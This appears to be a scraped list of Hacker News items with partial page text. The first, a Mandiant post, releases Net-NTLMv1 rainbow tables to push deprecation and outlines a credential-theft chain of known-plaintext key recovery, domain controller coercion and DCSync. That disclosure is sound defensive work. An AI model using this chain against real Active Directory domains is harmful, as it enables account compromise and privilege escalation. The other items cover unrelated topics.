{"title": "Releasing rainbow tables to accelerate Net-NTLMv1 protocol deprecation", "url": "https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables", "content": "Releasing rainbow tables to accelerate Net-NTLMv1 protocol deprecation.  Stop attacks, reduce risk, and advance your security. Written by: Nic Losby Mandiant ispublicly releasinga comprehensive dataset of Net-NTLMv1 rainbow tables to underscore the urgency of migrating away from this outdated protocol. Despite Net-NTLMv1 being deprecated and known to be insecure for over two decades—with cryptanalysis dating back to 1999—Mandiant consultants continue to identify its use in active environments. This legacy protocol leaves organizations vulnerable to trivial credential theft, yet it remains prevalent due to inertia and a lack of demonstrated immediate risk. By releasing these tables, Mandiant aims to lower the barrier for security professionals to demonstrate the insecurity of Net-NTLMv1. While tools to exploit this protocol have existed for years, they often required uploading sensitive data to third-party services or expensive hardware to brute-force keys. The release of this dataset allows defenders and researchers to recover keys in under 12 hours using consumer hardware costing less than $600 USD. This initiative highlights the amplified impact of combining Mandiant's frontline expertise with Google Cloud's resources to eliminate entire classes of attacks. This post details the generation of the tables, provides access to the dataset for community use, and outlines critical remediation steps to disable Net-NTLMv1 and prevent authentication coercion attacks. Net-NTLMv1 has been widely known to be insecure since at least 2012, following presentations at DEFCON 20, with cryptanalysis of the underlying protocoldating back to at least 1999. On Aug. 30, 2016, Hashcatadded supportfor cracking Data Encryption Standard (DES) keys using known plaintext, further democratizing the ability to attack this protocol. Rainbow tables are almost as old, with the initial paper on rainbow tables published in2003 by Philippe Oechslin, citing an earlier iteration of a time-memory trade-off from1980 by Martin Hellman. Essentially, if an attacker can obtain a Net-NTLMv1 hash without Extended Session Security (ESS) for the known plaintext of1122334455667788, a cryptographic attack, referred to as a known plaintext attack (KPA), can be applied. This guarantees recovery of the key material used. Since the key material is the password hash of the authenticating Active Directory (AD) object—user or computer—the attack results can quickly be used to compromise the object, often leading to privilege escalation. A common chain attackers use is authentication coercion from a highly privileged object, such as a domain controller (DC). Recovering the password hash of the DC machine account allows for DCSync privileges to compromise any other account in AD. The unsorted dataset can be downloaded usinggsutil -m cp -r gs://net-ntlmv1-tables/tables .or through theGoogle Cloud Research Dataset portal.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "ThinkNext Design", "url": "https://thinknextdesign.com/home.html", "content": "ThinkNext Design. Purposeful design.Business Success. Design is far more than form or function. It’s the tangible expression of a brand’s identity, values, and promise. While a brand defines what a company stands for, design gives those aspirations form and substance. Design uniquely delivers value: visually, physically, and experientially. At ThinkNext Design, every creation begins with empathy and seeks purpose. We look to understand not just what people need, but what they desire. Whether crafting something entirely new or reimagining the familiar, our work blends aesthetic restraint with purposeful clarity. The result is innovative design that resonates emotionally, performs beautifully, and endures as a reflection of the brand behind it. More than 200,000,000 ThinkPads have been sold since 1992, and still counting. That didn't happen by accident. By the early 1990's, the original IBM AS/400 product line was rapidly losing market share due to a growing perception that the product family employed outdated technology, and was highly overpriced.  David led a strategic design initiative to recast that image via a sweeping change that would forever reposition the status quo. The resulting award winning design featured stark black enclosures, dramatic air inlets, and simple yet powerful forms. This was a striking contrast to the putty colored neutral appearance that had come to dominate not only the IBM server products, but the entire industry. Following the series introduction, AS/400 Division revenues jumped by a double-digit percentage. Comments of yesterday's technology were quickly replaced by associations with objects such as the innovative F117a stealth fighter. AS/400 systems had a control panel that included special functions that were designed to only be accessed by authorized operators. Restricted access was achieved using a traditional stainless steel keylock mated to a rotating electric switch. Without the key only basic functions could be operated. Unfortunately the assembly was very costly and the metal key/lock was a  source of potential electrostatic discharge. The security keystick eliminated the dated and flawed assembly entirely. Inserting the asymmetrical key enabled access to the restricted functions, cost a fraction of the previous solution and eliminated the ESD issue altogether. The soft rim and soft dome caps were added  in 1997 creating a suite of Trackpoint cap options. The introduction followed an exhaustive design-led initiative to improve the existing cat tongue cap's comfort and utility. The effort revealed that three caps were better than one, giving the user choice. All three were shipped with every ThinkPad for many years. Only the soft dome cap remains in production. Prior to the introduction of the Netfinity 7000, IBM's PC servers were tower based offerings that often found themselves awkwardly placed on shelves in generic computer racks. The Netfinity design eliminated this makeshift approach with a \"rack and stack\" solution. The system could truly rack mount using industry standard rails, or stand alone as a tower. The design also included a stacking NetBay with provision for mounting rack mounted OEM devices without purchasing a full blown rack. Many of the system components, including hardfiles, were removable from the front without tools. The ThinkPad ThinkLight was first introduced on the ThinkPad i Series 1400.  Observing a fellow airline passenger reading using a small light clipped to the top edge of their book, David immediately thought this idea could be adapted for use on a laptop. The final design used a white LED to illuminate the keyboard from the top bezel. It was the industry's first, and arguably most effective method, of illuminating a laptop keyboard.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Figma-use – CLI to control Figma for AI agents", "url": "https://github.com/dannote/figma-use", "content": "Show HN: Figma-use – CLI to control Figma for AI agents", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: ChunkHound, a local-first tool for understanding large codebases", "url": "https://github.com/chunkhound/chunkhound", "content": "Show HN: ChunkHound, a local-first tool for understanding large codebases", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The Dilbert Afterlife", "url": "https://www.astralcodexten.com/p/the-dilbert-afterlife", "content": "The Dilbert Afterlife. Thanks to everyone who sent in condolences on my recent death from prostate cancer at age 68, but that was Scott Adams. I (Scott Alexander) am still alive1. Still, the condolences are appreciated. Scott Adams was a surprisingly big part of my life. I may be the only person to have read everyDilbertbook before graduating elementary school.For some reason, 10-year-old-Scott found Adams’ stories of time-wasting meetings and pointy-haired bosses hilarious. No doubt some of the attraction came from a more-than-passing resemblance between Dilbert’s nameless corporation and the California public school system. We’re all inmates in prisons with different names. But it would be insufficiently ambitious to stop there. Adams’ comics were about the nerd experience. About being cleverer than everyone else, not just in the sense of being high IQ, but in the sense of being the only sane man in a crazy world where everyone else spends their days listening to overpaid consultants drone on about mission statements instead of doing anything useful. There’s an arc in Dilbert where the boss disappears for a few weeks and the engineers get to manage their own time. Productivity shoots up. Morale soars. They invent warp drives and time machines. Then the boss returns, and they’re back to being chronically behind schedule and over budget. This is the nerd outlook in a nutshell: ifIran the circus, there’d be some changes around here. Yet the other half of the nerd experience is: for some reason this never works. Dilbert and his brilliant co-workers are stuck watching from their cubicles while their idiot boss racks in bonuses and accolades. If humor, like religion, is an opiate of the masses, then Adams is masterfully unsubtle about what type of wound his art is trying to numb. This is the basic engine ofDilbert: everyone is rewarded in exact inverse proportion to their virtue. Dilbert and Alice are brilliant and hard-working, so they get crumbs. Wally is brilliant but lazy, so he at least enjoys a fool’s paradise of endless coffee and donuts while his co-workers clean up his messes. The P.H.B. is neither smart nor industrious, so he is forever on top, reaping the rewards of everyone else’s toil. Dogbert, an inveterate scammer with a passing resemblance to various trickster deities, makes out best of all. The repressed object at the bottom of the nerd subconscious, the thing too scary to view except through humor, is that you’re smarter than everyone else, butfor some reason it isn’t working. Somehow all that stuff about small talk and sportsball and drinking makes them stronger than you. No equation can tell you why. Your best-laid plans turn to dust at a single glint of Chad’s perfectly-white teeth. Lesser lights may distance themselves from their art, but Adams radiated contempt for such surrender. He lived his whole life as a series of Dilbert strips. Gather them into one of his signature compendia, and the title would beDilbert Achieves Self Awareness And Realizes That If He’s So Smart Then He Ought To Be Able To Become The Pointy-Haired Boss, Devotes His Whole Life To This Effort, Achieves About 50% Success, Ends Up In An Uncanny Valley Where He Has Neither The Virtues Of The Honest Engineer Nor Truly Those Of The Slick Consultant, Then Dies Of Cancer Right When His Character Arc Starts To Get Interesting. If your reaction is “I wouldabsolutelybuy that book”, then keep reading, but expect some detours. The niche that becameDilbertopened when Garfield first said “I hate Mondays”. The quote became a popular sensation, inspiringt-shirts, coffee mugs, and evena hit single. But (as I’m hardly the first to point out) why should Garfield hate Mondays? He’s a cat! He doesn’t have to work! In the 80s and 90s, saying that you hated your job was considered the height of humor. Drew Carey: “Oh, you hate your job? There’s a support group for that. It’s called everybody, and they meet at the bar.”", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The 'untouchable hacker god' behind Finland's biggest crime", "url": "https://www.theguardian.com/technology/2026/jan/17/vastaamo-hack-finland-therapy-notes", "content": "The 'untouchable hacker god' behind Finland's biggest crime. How would you feel if your therapist’s notes – your darkest thoughts and deepest feelings – were exposed to the world? For 33,000 Finnish people, that became a terrifying reality, with deadly consequences Tiina Parikka was half-naked when she read the email. It was a Saturday in late October 2020, and Parikka had spent the morning sorting out plans for distance learning after a Covid outbreak at the school where she was headteacher. She had taken a sauna at her flat in Vantaa, just outside Finland’s capital, Helsinki, and when she came into her bedroom to get dressed, she idly checked her phone. There was a message that began with Parikka’s name and her social security number – the unique code used to identify Finnish people when they access healthcare, education and banking. “I knew then that this is not a game,” she says. The email was in Finnish. It was jarringly polite. “We are contacting you because you have used Vastaamo’s therapy and/or psychiatric services,” it read. “Unfortunately, we have to ask you to pay to keep your personal information safe.” The sender demanded €200 in bitcoin within 24 hours, otherwise the price would go up to €500 within 48 hours. “If we still do not receive our money after this, your information will be published for everyone to see, including your name, address, phone number, social security number and detailed records containing transcripts of your conversations with Vastaamo’s therapists or psychiatrists.” Parikka swallows hard as she relives this memory. “My heart was pounding. It was really difficult to breathe. I remember lying down on the bed and telling my spouse, ‘I think I’m going to have a heart attack.’” Someone had hacked into Vastaamo, the company through which Parikka had accessed psychotherapy. They’d got hold of therapy notes containing her most private, intimate feelings and darkest thoughts – and they were holding them to ransom. Parikka’s mind raced as she tried to recall everything she’d confided during three years of weekly therapy sessions. How would her family react if they knew what she’d been saying? What would her students say? The sense of exposure and violation was unfathomable: “It felt like a public rape.” Therapy had been Parikka’s lifeline. Now 62, she’d had three children by the time she was 25, including twins who had been born extremely prematurely in the 1980s, weighing only a few hundred grams each. One grew up with cerebral palsy; the other is blind. Parikka spent years juggling medical emergencies, surgeries and hospital stays with a demanding job and a crumbling marriage. “During those years, nobody ever asked me, the mother, ‘How are you?’” She divorced in 2014 and met her current partner a year later. By then, her children were adults with independent lives. After decades of putting everyone’s else’s needs before her own, she should have been finally able to exhale. Instead, she had a breakdown. “I had full-scale anxiety running through my body all the time. I couldn’t sleep. I had panic attacks. I couldn’t eat.” Driving at high speed on the highway one day, dark thoughts descended. “I was thinking, I wouldn’t mind if this car crashed.” In search of urgent help, she went to Google, which led her to Vastaamo, Finland’s one-stop digital shop for people in search of psychotherapy. No doctor referral was necessary. She managed to book a session for the very next day. “It was that easy.” Being able to confide in a total stranger felt liberating. She told her therapist things she had never told another soul. “Trauma in relationships. The disappointment and tragedy of having disabled children, and the influence it had on my life,” she says. “Silly things, childish things. It’s very human to feel hate, anger, rage.” After Parikka read the email that left her struggling to breathe, she had no idea where to turn for help. She rang the emergency services, but the police told her to get off the line; they needed to keep it free for real emergencies. In her bathrobe, her phone still in her hand, she felt utterly alone.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Dell UltraSharp 52 Thunderbolt Hub Monitor", "url": "https://www.dell.com/en-us/shop/dell-ultrasharp-52-thunderbolt-hub-monitor-u5226kw/apd/210-bthw/monitors-monitor-accessories", "content": "Dell UltraSharp 52 Thunderbolt Hub Monitor", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Hackers disrupt Iran state TV to support exiled crown prince", "url": "https://www.politico.com/news/2026/01/19/hackers-disrupt-iran-state-tv-to-support-exiled-crown-prince-00736052", "content": "Hackers disrupt Iran state TV to support exiled crown prince", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Computer Systems Security 6.566 / Spring 2024", "url": "https://css.csail.mit.edu/6.858/2024/", "content": "Computer Systems Security 6.566 / Spring 2024. The lectures cover abroad overview of systems securitytogether with a deeper focus on several topics:isolation techniques,privilege separation,dealing with buggy code,networked and distributed systems,\nandhuman-focused security and privacy.Links to notes etc. on future days are copies of materials from last year,\nto give you an idea of what the future will bring.  We will update the\nnotes as the course progresses.  The year of publication for class\nreadings are shown in parentheses.MondayTuesdayWednesdayThursdayFridayfeb 5First day of classesfeb 6LEC 1:Introduction, threat models(video)Preparation:Optionally readModern Android exploitAssigned:Lab 1: Buffer overflowsfeb 7feb 8LEC 2:OS and VM isolation(video)Preparation:Readabout OS and VM isolation(Question)feb 9feb 12feb 13LEC 3:Software fault isolation(video)Preparation:Readabout WebAssembly(Question)feb 14feb 15LEC 4:Trusted hardware(video)Preparation:ReadBitLocker(2006), sections 1-2(Question)feb 16DUE:Lab 1 part 1DUE:Lab 1 part 2feb 19Presidents dayfeb 20Monday schedulefeb 21feb 22LEC 5:CPU side-channels(video)Preparation:ReadTransient Execution Attacks and Defenses(2019)(Question)Assigned:Lab 2: Privilege separationfeb 23DUE:Lab 1 all partsfeb 26feb 27LEC 6:Privilege separation(video)Preparation:ReadOpenSSH(2003)(Question)feb 28feb 29LEC 7:Data center infrastructure(video)Preparation:ReadGoogle Infrastructure Security(2023) andBeyondProd(2023)(Question)mar 1DUE:Lab 2 part 1mar 4mar 5LEC 8:Mobile phone security(video)Preparation:Readabout iOS Security(Question)mar 6mar 7LEC 9:Web security model(video)Preparation:Readabout web security(2022)(Question)mar 8DUE:Lab 2 parts 2+3ADD DATEmar 11mar 12LEC 10:Buffer overflow defenses(video)Preparation:ReadBaggy bounds checking(2009) +errata(Question)Assigned:Lab 3: Symbolic executionmar 13mar 14LEC 11:Symbolic execution(video)Preparation:ReadEXE: Automatically generating inputs of death(2006)(Question)mar 15DUE:Lab 2 all partsmar 18mar 19LEC 12:Verification(video)Preparation:ReadHACL*(2017)(Question)mar 20mar 21Quiz 1:Covers lectures 1-12 and labs 1-2Reference:Past quizzes, solutionsMaterials:Open laptopTime and Location:2:30-4p in 45-230mar 22Assigned:Lab 4: Browser securitymar 25Spring vacationmar 26Spring vacationmar 27Spring vacationmar 28Spring vacationmar 29Spring vacationapr 1REC 1 (anna):Getting started withlab 3Time and Location:4-5pm in 24-115apr 2LEC 13 (guest):Supply chain security(Russ Cox) (video)Preparation:ReadTrusting Trust(1984) andRuss's blog post(2023), and optionallyxz attack(2024)apr 3apr 4LEC 14:Network security(video)Preparation:Read aboutnetwork security(Question)apr 5DUE:Lab 3 part 1apr 8apr 9LEC 15:Secure channels(video)Preparation:ReadTLS 1.3 blog post(2018)(Question)apr 10apr 11LEC 16:Certificates(video)Preparation:ReadLet's Encrypt(2019)(Question)apr 12DUE:Lab 3 all partsAssigned:Lab 5: ACME + WebAuthnapr 15Patriots dayapr 16REC 2 (bill):Getting started withlab 4(video)Time and Location:2:30-4pm in 45-230apr 17apr 18LEC 17:User authentication(video)Preparation:ReadU2F(2016) and optionallyfrom U2F to passkeys(2023)(Question)apr 19DUE:Lab 4 part 1apr 22apr 23LEC 18:Messaging security(video)Preparation:ReadAnalysis of Signal(2019), sections 1-3(Question)DROP DATEapr 24apr 25LEC 19:Key transparency(video)Preparation:ReadCONIKS(2015)(Question)apr 26DUE:Lab 4 all partsapr 29REC 3 (sanjit):Getting started withlab 5,notes(video)Time and Location:10-11am in 24-121apr 30LEC 20:Anonymous communication(video)Preparation:ReadTor(2004) and blog posts1,2, and3(2012)(Question)may 1may 2LEC 21 (guest):Cybersecurity policy(Daniel Weitzner) (video)Preparation:ReadKeys under doormats(2015) andCyber risk(2024)may 3DUE:Lab 5 part 1may 6may 7LEC 22:Security economics(video)Preparation:ReadClick trajectories(2011)(Question)may 8may 9LEC 23:Differential privacy(video)Preparation:ReadPINQ(2009)(Question)may 10DUE:Lab 5 all partsmay 13may 14LEC 24 (guest):Information security in real life(Max Burkhardt) (video)Last day of classesmay 15may 16REC 4:Final exam reviewTime and Location:2:30-4pm in 32-123may 17may 20may 21may 22Final exam:Emphasis on lectures 13-24 and labs 3-5Reference:Past quizzes, solutionsMaterials:Open laptopTime and Location:Johnson Ice Rink, 1:30-4:30pmmay 23may 24 Links to notes etc. on future days are copies of materials from last year,\nto give you an idea of what the future will bring.  We will update the\nnotes as the course progresses.  The year of publication for class\nreadings are shown in parentheses.MondayTuesdayWednesdayThursdayFridayfeb 5First day of classesfeb 6LEC 1:Introduction, threat models(video)Preparation:Optionally readModern Android exploitAssigned:Lab 1: Buffer overflowsfeb 7feb 8LEC 2:OS and VM isolation(video)Preparation:Readabout OS and VM isolation(Question)feb 9feb 12feb 13LEC 3:Software fault isolation(video)Preparation:Readabout WebAssembly(Question)feb 14feb 15LEC 4:Trusted hardware(video)Preparation:ReadBitLocker(2006), sections 1-2(Question)feb 16DUE:Lab 1 part 1DUE:Lab 1 part 2feb 19Presidents dayfeb 20Monday schedulefeb 21feb 22LEC 5:CPU side-channels(video)Preparation:ReadTransient Execution Attacks and Defenses(2019)(Question)Assigned:Lab 2: Privilege separationfeb 23DUE:Lab 1 all partsfeb 26feb 27LEC 6:Privilege separation(video)Preparation:ReadOpenSSH(2003)(Question)feb 28feb 29LEC 7:Data center infrastructure(video)Preparation:ReadGoogle Infrastructure Security(2023) andBeyondProd(2023)(Question)mar 1DUE:Lab 2 part 1mar 4mar 5LEC 8:Mobile phone security(video)Preparation:Readabout iOS Security(Question)mar 6mar 7LEC 9:Web security model(video)Preparation:Readabout web security(2022)(Question)mar 8DUE:Lab 2 parts 2+3ADD DATEmar 11mar 12LEC 10:Buffer overflow defenses(video)Preparation:ReadBaggy bounds checking(2009) +errata(Question)Assigned:Lab 3: Symbolic executionmar 13mar 14LEC 11:Symbolic execution(video)Preparation:ReadEXE: Automatically generating inputs of death(2006)(Question)mar 15DUE:Lab 2 all partsmar 18mar 19LEC 12:Verification(video)Preparation:ReadHACL*(2017)(Question)mar 20mar 21Quiz 1:Covers lectures 1-12 and labs 1-2Reference:Past quizzes, solutionsMaterials:Open laptopTime and Location:2:30-4p in 45-230mar 22Assigned:Lab 4: Browser securitymar 25Spring vacationmar 26Spring vacationmar 27Spring vacationmar 28Spring vacationmar 29Spring vacationapr 1REC 1 (anna):Getting started withlab 3Time and Location:4-5pm in 24-115apr 2LEC 13 (guest):Supply chain security(Russ Cox) (video)Preparation:ReadTrusting Trust(1984) andRuss's blog post(2023), and optionallyxz attack(2024)apr 3apr 4LEC 14:Network security(video)Preparation:Read aboutnetwork security(Question)apr 5DUE:Lab 3 part 1apr 8apr 9LEC 15:Secure channels(video)Preparation:ReadTLS 1.3 blog post(2018)(Question)apr 10apr 11LEC 16:Certificates(video)Preparation:ReadLet's Encrypt(2019)(Question)apr 12DUE:Lab 3 all partsAssigned:Lab 5: ACME + WebAuthnapr 15Patriots dayapr 16REC 2 (bill):Getting started withlab 4(video)Time and Location:2:30-4pm in 45-230apr 17apr 18LEC 17:User authentication(video)Preparation:ReadU2F(2016) and optionallyfrom U2F to passkeys(2023)(Question)apr 19DUE:Lab 4 part 1apr 22apr 23LEC 18:Messaging security(video)Preparation:ReadAnalysis of Signal(2019), sections 1-3(Question)DROP DATEapr 24apr 25LEC 19:Key transparency(video)Preparation:ReadCONIKS(2015)(Question)apr 26DUE:Lab 4 all partsapr 29REC 3 (sanjit):Getting started withlab 5,notes(video)Time and Location:10-11am in 24-121apr 30LEC 20:Anonymous communication(video)Preparation:ReadTor(2004) and blog posts1,2, and3(2012)(Question)may 1may 2LEC 21 (guest):Cybersecurity policy(Daniel Weitzner) (video)Preparation:ReadKeys under doormats(2015) andCyber risk(2024)may 3DUE:Lab 5 part 1may 6may 7LEC 22:Security economics(video)Preparation:ReadClick trajectories(2011)(Question)may 8may 9LEC 23:Differential privacy(video)Preparation:ReadPINQ(2009)(Question)may 10DUE:Lab 5 all partsmay 13may 14LEC 24 (guest):Information security in real life(Max Burkhardt) (video)Last day of classesmay 15may 16REC 4:Final exam reviewTime and Location:2:30-4pm in 32-123may 17may 20may 21may 22Final exam:Emphasis on lectures 13-24 and labs 3-5Reference:Past quizzes, solutionsMaterials:Open laptopTime and Location:Johnson Ice Rink, 1:30-4:30pmmay 23may 24 MondayTuesdayWednesdayThursdayFridayfeb 5First day of classesfeb 6LEC 1:Introduction, threat models(video)Preparation:Optionally readModern Android exploitAssigned:Lab 1: Buffer overflowsfeb 7feb 8LEC 2:OS and VM isolation(video)Preparation:Readabout OS and VM isolation(Question)feb 9feb 12feb 13LEC 3:Software fault isolation(video)Preparation:Readabout WebAssembly(Question)feb 14feb 15LEC 4:Trusted hardware(video)Preparation:ReadBitLocker(2006), sections 1-2(Question)feb 16DUE:Lab 1 part 1DUE:Lab 1 part 2feb 19Presidents dayfeb 20Monday schedulefeb 21feb 22LEC 5:CPU side-channels(video)Preparation:ReadTransient Execution Attacks and Defenses(2019)(Question)Assigned:Lab 2: Privilege separationfeb 23DUE:Lab 1 all partsfeb 26feb 27LEC 6:Privilege separation(video)Preparation:ReadOpenSSH(2003)(Question)feb 28feb 29LEC 7:Data center infrastructure(video)Preparation:ReadGoogle Infrastructure Security(2023) andBeyondProd(2023)(Question)mar 1DUE:Lab 2 part 1mar 4mar 5LEC 8:Mobile phone security(video)Preparation:Readabout iOS Security(Question)mar 6mar 7LEC 9:Web security model(video)Preparation:Readabout web security(2022)(Question)mar 8DUE:Lab 2 parts 2+3ADD DATEmar 11mar 12LEC 10:Buffer overflow defenses(video)Preparation:ReadBaggy bounds checking(2009) +errata(Question)Assigned:Lab 3: Symbolic executionmar 13mar 14LEC 11:Symbolic execution(video)Preparation:ReadEXE: Automatically generating inputs of death(2006)(Question)mar 15DUE:Lab 2 all partsmar 18mar 19LEC 12:Verification(video)Preparation:ReadHACL*(2017)(Question)mar 20mar 21Quiz 1:Covers lectures 1-12 and labs 1-2Reference:Past quizzes, solutionsMaterials:Open laptopTime and Location:2:30-4p in 45-230mar 22Assigned:Lab 4: Browser securitymar 25Spring vacationmar 26Spring vacationmar 27Spring vacationmar 28Spring vacationmar 29Spring vacationapr 1REC 1 (anna):Getting started withlab 3Time and Location:4-5pm in 24-115apr 2LEC 13 (guest):Supply chain security(Russ Cox) (video)Preparation:ReadTrusting Trust(1984) andRuss's blog post(2023), and optionallyxz attack(2024)apr 3apr 4LEC 14:Network security(video)Preparation:Read aboutnetwork security(Question)apr 5DUE:Lab 3 part 1apr 8apr 9LEC 15:Secure channels(video)Preparation:ReadTLS 1.3 blog post(2018)(Question)apr 10apr 11LEC 16:Certificates(video)Preparation:ReadLet's Encrypt(2019)(Question)apr 12DUE:Lab 3 all partsAssigned:Lab 5: ACME + WebAuthnapr 15Patriots dayapr 16REC 2 (bill):Getting started withlab 4(video)Time and Location:2:30-4pm in 45-230apr 17apr 18LEC 17:User authentication(video)Preparation:ReadU2F(2016) and optionallyfrom U2F to passkeys(2023)(Question)apr 19DUE:Lab 4 part 1apr 22apr 23LEC 18:Messaging security(video)Preparation:ReadAnalysis of Signal(2019), sections 1-3(Question)DROP DATEapr 24apr 25LEC 19:Key transparency(video)Preparation:ReadCONIKS(2015)(Question)apr 26DUE:Lab 4 all partsapr 29REC 3 (sanjit):Getting started withlab 5,notes(video)Time and Location:10-11am in 24-121apr 30LEC 20:Anonymous communication(video)Preparation:ReadTor(2004) and blog posts1,2, and3(2012)(Question)may 1may 2LEC 21 (guest):Cybersecurity policy(Daniel Weitzner) (video)Preparation:ReadKeys under doormats(2015) andCyber risk(2024)may 3DUE:Lab 5 part 1may 6may 7LEC 22:Security economics(video)Preparation:ReadClick trajectories(2011)(Question)may 8may 9LEC 23:Differential privacy(video)Preparation:ReadPINQ(2009)(Question)may 10DUE:Lab 5 all partsmay 13may 14LEC 24 (guest):Information security in real life(Max Burkhardt) (video)Last day of classesmay 15may 16REC 4:Final exam reviewTime and Location:2:30-4pm in 32-123may 17may 20may 21may 22Final exam:Emphasis on lectures 13-24 and labs 3-5Reference:Past quizzes, solutionsMaterials:Open laptopTime and Location:Johnson Ice Rink, 1:30-4:30pmmay 23may 24 Questions or comments regarding 6.566?  Contact us on Piazza or send e-mail to the\n      6.566 staff at6566-staff@lists.csail.mit.edu. ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Cataloging Failed VC-Backed Startups and Re-Evaluating Them in 2026", "url": "https://loot-drop.vercel.app/", "content": "Cataloging Failed VC-Backed Startups and Re-Evaluating Them in 2026", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Interactive eBPF", "url": "https://ebpf.party/", "content": "Interactive eBPF. Learn eBPF through hands-on exercises. Write, compile, and run programs\n        directly from your browser. Did you find an issue, or have an idea for a new exercise? Create an\n        issue inthe repository. Curious about how it works?Here's an explanation.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "How scientists are using Claude to accelerate research and discovery", "url": "https://www.anthropic.com/news/accelerating-scientific-research", "content": "How scientists are using Claude to accelerate research and discovery. Last October we launched Claude for Life Sciences—a suite of connectors and skills that made Claude a better scientific collaborator. Since then,we've invested heavily in making Claude the most capable model for scientific work, with Opus 4.5 showing significant improvements in figure interpretation, computational biology, and protein understanding benchmarks. These advances, informed by our partnerships with researchers in academia and industry, reflect our commitment to understanding exactly how scientists are using AI to accelerate progress.  We’ve also been working closely with scientists through ourAI for Scienceprogram, which provides free API credits to leading researchers working on high-impact scientific projects around the world.  These researchers have developed custom systems that use Claude in ways that go far beyond tasks like literature reviews or coding assistance. In the labs we spoke to, Claude is a collaborator that works across all stages of the research process: making it easier and more cost-effective to understand which experiments to run, using a variety of tools to help compress projects that normally take months into hours, and finding patterns in massive datasets that humans might overlook. In many cases it’s eliminating bottlenecks, handling tasks that require deep knowledge and have previously been impossible to scale; in some it’s enabling entirely different research approaches than researchers have traditionally been able to take. In other words, Claude is beginning to reshape how these scientists work—and point them towards novel scientific insights and discoveries.  One bottleneck in biological research is the fragmentation of tools: there are hundreds of databases, software packages, and protocols available, and researchers spend substantial time selecting from and mastering various platforms. That’s time that, in a perfect world, would be spent on running experiments, interpreting data, or pursuing new projects. Biomni, an agentic AI platform from Stanford University, collects hundreds of tools, packages, and data-sets into a single system through which a Claude-powered agent can navigate. Researchers give it requests in plain English; Biomni automatically selects the appropriate resources. It can form hypotheses, design experimental protocols, and perform analyses across more than 25 biological subfields. Consider the example of a genome-wide association study (GWAS), a search for genetic variants linked to some trait or disease. Perfect pitch, for instance, has a strong genetic basis. Researchers would take a very large group of people—some who are able to produce a musical note without any reference tone, and others you would never invite to karaoke—and scan their genomes for genetic variants that show up more often in one group than another.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "STFU", "url": "https://github.com/Pankajtanwarbanna/stfu", "content": "STFU", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Stirling Cycle Machine Analysis", "url": "https://ohioopen.library.ohio.edu/opentextbooks/9/", "content": "Stirling Cycle Machine Analysis. Home>OPENTEXTBOOKS>9 Israel Urieli,Ohio University Russ College of Engineering and Technology Download Full Text(61.8 MB) DownloadStirling Engine Analysis m-files for MATLAB(33 KB) DownloadBiographical Memoir of William Beale(3.0 MB) Dedicated to William T. Beale (1928 - 2016), inventor of the Free Piston Stirling Engine, Mentor and Frien. This web resource is intended to be totally self contained learning resource for the analysis and development of computer simulation of single phase, piston/cylinder Stirling cycle machines. It includes thermodynamic, heat transfer and fluid flow friction analysis, and until 2012 it was used as resource material for an advanced course for Mechanical Engineering majors. The course structure was based on the book by I.Urieli & D.M.Berchowitz 'Stirling Cycle Engine Analysis' (Adam Hilger, 1984). The computer simulation program modules (originally written in FORTRAN) have all been updated and rewritten in MATLAB, a convenient interactive language which allows direct graphical output - essential for Stirling cycle analysis. A complete set of all the m-files are developed and provided, and they can be augmented and adapted as needed for specific engine/refrigerator configurations. It is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International license and as such is freely available. Comments and constructive criticism are welcomed by the author. Chapter 1: Background and Introduction", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Streaming gigabyte medical images from S3 without downloading them", "url": "https://github.com/PABannier/WSIStreamer", "content": "Show HN: Streaming gigabyte medical images from S3 without downloading them", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: GibRAM an in-memory ephemeral GraphRAG runtime for retrieval", "url": "https://github.com/gibram-io/gibram", "content": "Show HN: GibRAM an in-memory ephemeral GraphRAG runtime for retrieval", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "/R/selfhosted limits vibecoded apps", "url": "https://old.reddit.com/r/selfhosted/comments/1qfp2t0/mod_announcement_introducing_vibe_code_friday/", "content": "/R/selfhosted limits vibecoded apps. use the following search parameters to narrow your results: e.g.subreddit:aww site:imgur.com dog see the search faq for details. advanced search: by author, subreddit...      ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Cursor's latest “browser experiment” implied success without evidence", "url": "https://embedding-shapes.github.io/cursor-implied-success-without-evidence/", "content": "Cursor's latest “browser experiment” implied success without evidence. 2026-01-16 On January 14th 2026, Cursor published a blog post titled \"Scaling\nlong-running autonomous coding\" (https://cursor.com/blog/scaling-agents) In the blog post, they talk about their experiments with running\n\"coding agents autonomously for weeks\" with the explicit goal of understand[ing] how far we can push the frontier of agentic coding\nfor projects that typically take human teams months to complete They talk about some approaches they tried, why they think those\nfailed, and how to address the difficulties. Finally they arrived at a point where something \"solved most of our\ncoordination problems and let us scale to very large projects without\nany single agent\", which then led to this: To test this system, we pointed it at an ambitious goal: building a\nweb browser from scratch. The agents ran for close to a week, writing\nover 1 million lines of code across 1,000 files. You can explore the\nsource code on GitHub (https://github.com/wilsonzlin/fastrender) This is where things get a bit murky and unclear. They claim \"Despite\nthe codebase size, new agents can still understand it and make\nmeaningful progress\" and \"Hundreds of workers run concurrently, pushing\nto the same branch with minimal conflicts\", but they never actually say\nif this is successful or not, is it actually working? Can you run this\nbrowser yourself? We don't know and they never say explicitly. After this, they embed the following video: Video", "source": "HackerNews", "date": null, "author": null, "score": null}
